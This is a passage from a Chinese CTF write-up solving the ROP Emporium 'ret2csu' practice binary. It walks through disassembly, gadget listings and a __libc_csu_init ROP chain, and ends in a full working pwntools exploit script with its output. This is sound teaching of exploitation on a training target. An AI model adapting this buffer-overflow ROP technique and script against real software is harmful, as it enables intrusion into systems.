.text:000000000040062A                 call    _ret2win
.text:000000000040062F                 nop
.text:0000000000400630                 pop     rbp
.text:0000000000400631                 retn
.text:0000000000400631 ; } // starts at 400617
.text:0000000000400631 usefulFunction  endp
```

调用后门函数，但是参数是错误的

题目的意图很明确，需要满足参数条件后，直接调用 win 函数

*   rdi = 0xDEADBEEFDEADBEEF
*   rsi = 0xCAFEBABECAFEBABE
*   rdx= 0xD00DF00DD00DF00D

gadgets 不满足目标：没法修改这三个值

```
ret2csu.zip.d ➤ ROPgadget --binary ret2csu --only "pop|ret"
Gadgets information
============================================================
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006a0 : pop r14 ; pop r15 ; ret
0x00000000004006a2 : pop r15 ; ret
0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400588 : pop rbp ; ret
0x00000000004006a3 : pop rdi ; ret
0x00000000004006a1 : pop rsi ; pop r15 ; ret
0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004e6 : ret
 
Unique gadgets found: 11
```

main 函数下面一点可以看到 csu 函数，这里提供了有用的片段：

```
.text:0000000000400680 loc_400680:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400680                 mov     rdx, r15
.text:0000000000400683                 mov     rsi, r14
.text:0000000000400686                 mov     edi, r13d
.text:0000000000400689                 call    ds:(__frame_dummy_init_array_entry - 600DF0h)[r12+rbx*8]
.text:000000000040068D                 add     rbx, 1
.text:0000000000400691                 cmp     rbp, rbx
.text:0000000000400694                 jnz     short loc_400680
.text:0000000000400696
.text:0000000000400696 loc_400696:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400696                 add     rsp, 8
.text:000000000040069A                 pop     rbx
.text:000000000040069B                 pop     rbp
.text:000000000040069C                 pop     r12
.text:000000000040069E                 pop     r13
.text:00000000004006A0                 pop     r14
.text:00000000004006A2                 pop     r15
.text:00000000004006A4                 retn
```

上半部分可以给这三个寄存器赋值然后 call 一个地址，需要我们能控制 r13，r14，r15 三个寄存器，以及 rbx=0，r12=call win 函数

下半部分能满足我们要控制的寄存器的要求

思路：

1.  溢出跳转到 csu 函数后半部分，给寄存器赋值
2.  然后再跳转到 csu 函数前半部分，调用 win 函数

但是这里存在一个问题，就是赋值 rdi 的那个指令：

```
.text:0000000000400686                 mov     edi, r13d
```

只能赋值 4 字节，高 4 字节赋值不了，所以不能通过 call [r12+rbx*8] 调用 win 函数

这里需要解引用到一个无关紧要的函数上

小知识点，需要解引用找函数跳板去 elf 的 LOAD 段去找：

```
LOAD:0000000000600E00 01 00 00 00 00 00 00 00 01 00 _DYNAMIC        Elf64_Dyn <1, 1>        ; DATA XREF: LOAD:0000000000400130↑o
LOAD:0000000000600E00 00 00 00 00 00 00                                                     ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o
LOAD:0000000000600E00                                                                       ; DT_NEEDED libret2csu.so
LOAD:0000000000600E10 01 00 00 00 00 00 00 00 38 00…                Elf64_Dyn <1, 38h>      ; DT_NEEDED libc.so.6
LOAD:0000000000600E20 1D 00 00 00 00 00 00 00 78 00…                Elf64_Dyn <1Dh, 78h>    ; DT_RUNPATH .
LOAD:0000000000600E30 0C 00 00 00 00 00 00 00 D0 04…                Elf64_Dyn <0Ch, 4004D0h> ; DT_INIT
LOAD:0000000000600E40 0D 00 00 00 00 00 00 00 B4 06…                Elf64_Dyn <0Dh, 4006B4h> ; DT_FINI
LOAD:0000000000600E50 19 00 00 00 00 00 00 00 F0 0D…                Elf64_Dyn <19h, 600DF0h> ; DT_INIT_ARRAY
LOAD:0000000000600E60 1B 00 00 00 00 00 00 00 08 00…                Elf64_Dyn <1Bh, 8>      ; DT_INIT_ARRAYSZ
LOAD:0000000000600E70 1A 00 00 00 00 00 00 00 F8 0D…                Elf64_Dyn <1Ah, 600DF8h> ; DT_FINI_ARRAY
LOAD:0000000000600E80 1C 00 00 00 00 00 00 00 08 00…                Elf64_Dyn <1Ch, 8>      ; DT_FINI_ARRAYSZ
LOAD:0000000000600E90 F5 FE FF 6F 00 00 00 00 98 02…                Elf64_Dyn <6FFFFEF5h, 400298h> ; DT_GNU_HASH
LOAD:0000000000600EA0 05 00 00 00 00 00 00 00 C0 03…                Elf64_Dyn <5, 4003C0h>  ; DT_STRTAB
LOAD:0000000000600EB0 06 00 00 00 00 00 00 00 D0 02…                Elf64_Dyn <6, 4002D0h>  ; DT_SYMTAB
LOAD:0000000000600EC0 0A 00 00 00 00 00 00 00 7A 00…                Elf64_Dyn <0Ah, 7Ah>    ; DT_STRSZ
LOAD:0000000000600ED0 0B 00 00 00 00 00 00 00 18 00…                Elf64_Dyn <0Bh, 18h>    ; DT_SYMENT
LOAD:0000000000600EE0 15 00 00 00 00 00 00 00 00 00…                Elf64_Dyn <15h, 0>      ; DT_DEBUG
LOAD:0000000000600EF0 03 00 00 00 00 00 00 00 00 10…                Elf64_Dyn <3, 601000h>  ; DT_PLTGOT
LOAD:0000000000600F00 02 00 00 00 00 00 00 00 30 00…                Elf64_Dyn <2, 30h>      ; DT_PLTRELSZ
LOAD:0000000000600F10 14 00 00 00 00 00 00 00 07 00…                Elf64_Dyn <14h, 7>      ; DT_PLTREL
LOAD:0000000000600F20 17 00 00 00 00 00 00 00 A0 04…                Elf64_Dyn <17h, 4004A0h> ; DT_JMPREL
LOAD:0000000000600F30 07 00 00 00 00 00 00 00 70 04…                Elf64_Dyn <7, 400470h>  ; DT_RELA
LOAD:0000000000600F40 08 00 00 00 00 00 00 00 30 00…                Elf64_Dyn <8, 30h>      ; DT_RELASZ
LOAD:0000000000600F50 09 00 00 00 00 00 00 00 18 00…                Elf64_Dyn <9, 18h>      ; DT_RELAENT
LOAD:0000000000600F60 FE FF FF 6F 00 00 00 00 50 04…                Elf64_Dyn <6FFFFFFEh, 400450h> ; DT_VERNEED
LOAD:0000000000600F70 FF FF FF 6F 00 00 00 00 01 00…                Elf64_Dyn <6FFFFFFFh, 1> ; DT_VERNEEDNUM
LOAD:0000000000600F80 F0 FF FF 6F 00 00 00 00 3A 04…                Elf64_Dyn <6FFFFFF0h, 40043Ah> ; DT_VERSYM
LOAD:0000000000600F90 00 00 00 00 00 00 00 00 00 00…                Elf64_Dyn <0>           ; DT_NULL
```

这里保存了很多函数的地址，解引用拿到的就是函数本身，其中 0x600E40 的函数 dt_fini：

```
.fini:00000000004006B4                                               public _term_proc
.fini:00000000004006B4                               _term_proc      proc near               ; DATA XREF: LOAD:00000000004003A8↑o
.fini:00000000004006B4 48 83 EC 08                                   sub     rsp, 8          ; _fini
.fini:00000000004006B8 48 83 C4 08                                   add     rsp, 8
.fini:00000000004006BC C3                                            retn
.fini:00000000004006BC                               _term_proc      endp
```

不会对我们的参数和布局产生影响，太适合了

接下来是：

```
.text:000000000040068D                 add     rbx, 1
.text:0000000000400691                 cmp     rbp, rbx
.text:0000000000400694                 jnz     short loc_400680
```

这里 rbp 和 rbx 都是之前控制的，我们需要让这个跳转不成立，就需要 rbx+1==rbp 的值

完成之后，再 rsp+8，pop6 个值之后就是下一个返回地址，从这里去修改 rdi 为目标值，然后跳转去 win 函数即可

exp：

```
#!/bin/python3
from Crypto.Util.number import *
from pwn import *
warnings.filterwarnings(action='ignore',category=BytesWarning)
context.log_level = 'debug'
FILE_NAME = "ret2csu"
REMOTE_HOST = ""
REMOTE_PORT = 0


elf = context.binary = ELF(FILE_NAME)
libc = elf.libc

gs = '''
'''
def start():
    if args.REMOTE:
        return remote(REMOTE_HOST,REMOTE_PORT)
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# =======================================

io = start()

# =============================================================================
# ============== exploit ===================

"""
.text:0000000000400680 loc_400680:                             ; CODE XREF: __libc_csu_init+54↓j
.text:0000000000400680                 mov     rdx, r15
.text:0000000000400683                 mov     rsi, r14
.text:0000000000400686                 mov     edi, r13d
.text:0000000000400689                 call    ds:(__frame_dummy_init_array_entry - 600DF0h)[r12+rbx*8]
.text:000000000040068D                 add     rbx, 1
.text:0000000000400691                 cmp     rbp, rbx
.text:0000000000400694                 jnz     short loc_400680
.text:0000000000400696
.text:0000000000400696 loc_400696:                             ; CODE XREF: __libc_csu_init+34↑j
.text:0000000000400696                 add     rsp, 8
.text:000000000040069A                 pop     rbx
.text:000000000040069B                 pop     rbp
.text:000000000040069C                 pop     r12
.text:000000000040069E                 pop     r13
.text:00000000004006A0                 pop     r14
.text:00000000004006A2                 pop     r15
.text:00000000004006A4                 retn
"""
csu1 = 0x000000000400680 
csu2 = 0x00000000040069A             
call_win = 0x000000000400510         
pwnme_got = 0x000000000601018
pop_rdi = 0x00000000004006a3 #: pop rdi ; ret
safe_deference = 0x000000000600E48


rdi = 0xDEADBEEFDEADBEEF
rsi = 0xCAFEBABECAFEBABE
rdx = 0xD00DF00DD00DF00D
rbp = 0x000000000601028

payload = b"A" * 0x28
payload += pack(csu2)
payload += pack(0)+pack(1) + pack(safe_deference) + pack(rdi) + pack(rsi) + pack(rdx)
payload += pack(csu1)
payload += pack(0)*7
payload += pack(pop_rdi) + pack(rdi)
payload += pack(call_win)
io.sendafter(b"> ",payload)

io.interactive()
```

运行结果：

```
ret2csu.zip.d ➤ python3 exp.py
Thank you!
ROPE{a_placeholder_32byte_flag!}
```

总结
--

8 个练习最有难度的对我来说就是 fluff 去理解两个陌生的指令，其他的嘛，基本上就是出啥躲啥

我愿称之为：一次不错的查漏补缺之旅

‍

[[培训]《安卓高级研修班 (网课)》月薪三万计划，掌握调试、分析还原 ollvm、vmp 的方法，定制 art 虚拟机自动化脱壳的方法](https://www.kanxue.com/book-section_list-84.htm)

[#基础知识](forum-171-1-180.htm) [#漏洞机制](forum-171-1-181.htm) [#溢出](forum-171-1-182.htm) [#专题](forum-171-1-186.htm) [#题解集锦](forum-171-1-187.htm)